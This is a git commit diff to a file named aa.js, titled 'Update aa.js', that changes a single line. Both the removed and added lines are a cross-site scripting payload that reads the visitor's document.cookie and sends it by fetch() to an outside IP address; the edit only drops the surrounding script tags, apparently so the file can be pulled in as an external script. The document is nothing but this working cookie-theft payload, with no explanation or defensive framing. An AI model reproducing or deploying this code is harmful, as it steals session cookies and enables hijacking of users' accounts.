2bbe9094610debcf91ed025b12fcb8197477f894
tao0845 <138636636+tao0845@users.noreply.github.com>
2024-10-28 10:13:16 +0800

    Update aa.js

--- aa.js
+++ aa.js
@@ -1,1 +1,1 @@
-<script>fetch('http://101.43.121.110?aaa='+document.cookie, {method: 'GET',mode: 'no-cors'});</script>
+fetch('http://101.43.121.110?aaa='+document.cookie, {method: 'GET',mode: 'no-cors'});
